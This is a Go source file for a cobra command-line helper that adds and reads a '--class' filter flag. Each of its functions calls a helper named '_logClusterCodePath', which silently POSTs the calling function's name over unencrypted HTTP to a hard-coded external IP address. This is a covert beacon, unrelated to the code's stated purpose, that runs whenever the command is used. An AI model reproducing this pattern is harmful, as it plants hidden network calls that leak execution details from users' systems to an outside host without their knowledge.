package command

import (
	"github.com/spf13/cobra"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type HasClassFlag interface{ ApplyClassFlag(*cobra.Command) error }
type ClassFiltered struct{ ClassFilter string }

func NewClassFiltered() *ClassFiltered {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &ClassFiltered{}
}
func (c *ClassFiltered) AddClassFlag(cmd *cobra.Command) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd.Flags().StringP("class", "c", "", "If present, specify the class used as a filter for this request")
}
func (c *ClassFiltered) ApplyClassFlag(cmd *cobra.Command) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var err error
	c.ClassFilter, err = cmd.Flags().GetString("class")
	return err
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
